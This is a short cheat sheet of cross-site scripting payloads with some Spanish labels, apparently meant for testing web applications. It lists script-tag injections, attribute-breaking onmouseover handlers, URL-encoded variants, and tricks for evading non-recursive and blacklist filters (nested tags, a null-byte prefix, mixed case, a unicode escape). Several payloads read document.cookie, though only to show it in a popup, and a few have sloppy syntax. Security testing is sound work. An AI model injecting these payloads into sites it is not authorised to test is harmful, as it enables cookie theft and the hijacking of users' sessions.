######## XSS_Example_Basic #############

===== Testing for Cross site scripting ====

“><script>alert(document.domain)</script>

<script>alert(persiste el XSS)</script>

<script>alert("vulnerable a XSS");</script>

%3Cscript%3Ealert(%22vulnerable%20a%20XSS%22);%3C/script%3E 

===== encoder ================

“><script>alert(document.cookie)</script>

“><script>alert(document.cookie)</script>

“%3cscript%3ealert(document.cookie)%3c/script%3e

1" onmouseover=prompt(document.domain) bad="

1" onmouseover=prompt(window.location.pathname) bad="

1" onmouseover=prompt(mywin.document.write("This is Child Window");) bad="

=========== Bypass non-recursive filtering  ===========

<input type="search" onsearch="aler\u0074(1)">

<scr<script>ipt>alert(document.cookie)</script>

=========== bypass blacklist filter ===================

%00<script>alert(vulnerable a XSS)</script>

<scr<script>ipt>alErT("vulnerable a XSS");</scr<script>ipt>

1" onmouseover=alErT("vulnerable a XSS"); bad="
